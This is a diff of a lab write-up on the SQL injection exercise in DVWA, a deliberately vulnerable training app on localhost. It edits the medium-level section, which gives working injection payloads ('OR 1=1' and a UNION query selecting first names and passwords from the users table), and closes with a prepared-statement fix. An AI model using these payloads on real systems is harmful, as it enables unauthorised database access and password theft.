@@ -2,7 +2,7 @@
 description: http://localhost/DVWA/vulnerabilities/sqli/
 ---
 
-# SQL Injection --
+# SQL Injection
 
 <details>
 
@@ -150,25 +150,21 @@ In this level clicking on first page, we obtain a redirect to a second page to s
 
 #### 1st Payload
 
-In this case payload is always the same of low level, but we need to add it into second page.
+In this case payload is always the same of low level, but we need to add it into second page, infact we've two request (GET and POST)
 
-Then in this case, we can use following payload: `' OR 1=1 --`&#x20;
+However, we can use following payload: `1' OR 1=1 --`&#x20;
 
 ```sql
-SELECT first_name, last_name FROM users WHERE user_id = '' OR 1=1 -- ';
+SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1 -- ';
 ```
 
-This permit us to see all DB results:
+that permit us to see all DB results:
 
-<div align="left">
-
-<figure><img src="../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>
-
-</div>
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 #### 2nd Payload
 
-Regarding that query selects: first\_name, last\_name field from users table, we can use [UNION](https://www.w3schools.com/sql/sql\_union.asp) operator to add a new query:  `' UNION select first_name,password from users --`&#x20;
+How last levels, we can use [UNION](https://www.w3schools.com/sql/sql\_union.asp) operator to add a new query:  `' UNION select first_name,password from users --`&#x20;
 
 ```sql
 SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT first_name,password FROM users -- ';
@@ -176,7 +172,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT first_na
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -191,8 +187,6 @@ The input is not sanitized, so I can execute any (potentially malicious) command
 ## Impossible
 
 <figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>
-
-
 
 The best solution is to sanitize query using a prepared statement, to delineate part static and dinamic (id) of query; take a binding parameter to check if is it an integer or char; insert a control to count rows number as result; and use a [CSRF](csrf.md) token.
 
